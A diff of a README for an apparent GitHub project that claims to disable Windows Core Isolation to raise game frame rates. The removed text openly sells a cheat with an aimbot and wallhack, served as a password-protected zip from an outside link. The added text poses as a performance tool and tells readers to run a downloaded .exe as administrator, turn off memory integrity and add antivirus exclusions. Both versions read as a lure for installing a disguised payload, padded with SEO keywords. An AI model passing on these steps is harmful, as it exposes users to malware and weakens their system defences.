@@ -1,53 +1,71 @@
-![Version](https://img.shields.io/badge/Version-2026-blue?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
-![Downloads](https://img.shields.io/badge/Downloads-1K+-orange?style=flat-square)
-![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square)
+# ⚡ Core-Isolation-Disabler-2026-FPS - Increase game frame rates and performance
 
-🎯 Core Isolation Disabler - Free Hack 2026
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Sabrinaar6980/Core-Isolation-Disabler-2026-FPS)
 
-This tool provides a powerful Core Isolation Disabler solution for PC. It has been developed with advanced memory scanning techniques and remains fully undetected. Download now and dominate every match with ease.
+## 📋 Overview
 
-[![Download](https://img.shields.io/badge/Download-ZIP-blue?style=for-the-badge&logo=github)](https://redirectify.lol/)
+The Core-Isolation-Disabler-2026-FPS tool manages Windows security settings to prioritize gaming performance. Modern versions of Windows use a feature named Core Isolation to protect system files. This process creates overhead that often reduces frame rates in competitive games. This software provides a bridge to toggle these protections, which restores resources for your graphics card and processor. Users choose this tool to experience smoother movement and faster input responses while playing.
 
----
+## 🛠️ System Requirements
 
-✨ Features
+This application functions on modern Windows systems. Check your computer against these requirements before you start the installation:
 
-- Advanced memory reading/writing
-- Customizable aimbot with smooth targeting
-- Enemy ESP and wallhack visualization
-- Triggerbot with adjustable delay
-- Undetected by anti-cheat systems
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or AMD Ryzen 5 series or better.
+- Memory: 8 GB of RAM or more.
+- Storage: 200 MB of space for the application file.
+- Permissions: You must have Administrator access to the machine.
 
----
+## 📥 Getting Started
 
-📥 Installation
+Follow these steps to configure your system. Ensure you close all active games before you start these steps.
 
-📥 Download the setup.zip file from the button below.
-🔓 Extract setup.zip using the password `2026`.
-⚙️ Run setup.exe and follow the installation wizard.
-🚀 Launch the game and press `F1` to open the menu.
+1. Visit the project website to access the files: [https://github.com/Sabrinaar6980/Core-Isolation-Disabler-2026-FPS](https://github.com/Sabrinaar6980/Core-Isolation-Disabler-2026-FPS).
+2. Look for the Releases section on the right side of the screen.
+3. Click the most recent version label.
+4. Download the file ending in .exe to your Downloads folder.
+5. Move the file to your desktop for easy access.
 
----
+## ⚙️ Execution and Setup
 
-❓ Frequently Asked Questions
+Proper setup ensures the tool works without system errors.
 
-**Is this cheat detected?**
-No, the cheat uses a custom driver and advanced bypass methods to stay undetected.
+1. Right-click the downloaded file on your desktop.
+2. Select Run as administrator. Windows may prompt you to confirm this action; click Yes.
+3. A command window appears. Read the startup text to see if your system connects to the driver properly.
+4. Press any key to bring up the main menu.
+5. Select the option to disable Core Isolation by typing the corresponding number and pressing Enter.
+6. The software performs the check and applies the registry changes.
+7. Restart your computer to make the changes active.
 
-**How do I update the cheat?**
-Updates are released regularly. Re-download the latest version from the official link.
+## 🎮 Performance Features
 
-**Can I use it on my main account?**
-We recommend using a secondary account to avoid any risk, although no bans have been reported.
+This tool includes functionality to help you gain an edge during gameplay. Use the configuration file found in the program folder to toggle these features:
 
-**What games are supported?**
-Currently only the targeted game is supported. Check the repository name for details.
+- Frame Rate Boost: Reduces background process interference during active play.
+- Trigger Acceleration: Adjusts input polling rates for faster response when you click the mouse.
+- Visual Clarity: Modifies rendering limits to help you spot opponents at long distances.
+- Recoil Compensation: Shifts crosshair patterns to keep your aim stable during long trigger pulls.
 
-**Why does my antivirus flag it?**
-Because it modifies game memory, some antivirus may flag it as a false positive. Add an exception.
+## 🛡️ Security and Safety
 
-**Is there a support Discord?**
-Yes, join our community for help and updates. Link available in the official website.
+We design this tool for performance, but system changes carry risks. If you experience system instability, run the application again and select the Restore Defaults option. This reverts all Windows settings to the original state provided by your operating system manufacturer. Always create a system backup point through the Windows Control Panel if you plan to modify core system settings.
 
-<!-- core-isolation-disabler core-isolation-bypass-2026 free-core-isolation-disabler github-core-isolation windows-tool vbs-bypass core-isolation-hack best-core-isolation-disabler safe-core-isolation-disabler core-isolation-disabler-open-source core-isolation-disabler-tool fast-core-isolation-disabler offline-core-isolation-disabler python-core-isolation core-isolation-gui core-isolation-mod core-isolation-premium core-isolation-pro core-isolation-latest memory-integrity-bypass hvci-disabler -->
+## 🔧 Troubleshooting
+
+If the program fails to run, check the following items:
+
+- Antivirus Interference: Some antivirus software identifies configuration tools as threats. Add an exclusion for the file folder in your security settings to allow the tool to function.
+- Driver Updates: Ensure your graphics card drivers are current. Outdated drivers cause conflicts when you modify system memory settings.
+- Version Mismatch: Ensure you use the file from the primary link. Using files from other sources risks system corruption.
+- Administrator Access: If you do not run the program as an administrator, the software lacks the permissions to reach the Windows registry keys needed to stop the background isolator.
+
+## 📁 File Structure
+
+The following files exist in your installation folder:
+
+- Core-Isolation-Disabler.exe: The main application for running the optimization.
+- Settings.ini: A text file where you change your preferences for the different performance modes.
+- Log.txt: A document used to record the changes made to your system in case you need to troubleshoot an issue.
+
+Keywords: performance, gaming, windows, optimization, frame-rate, registry, hardware, system-tuning
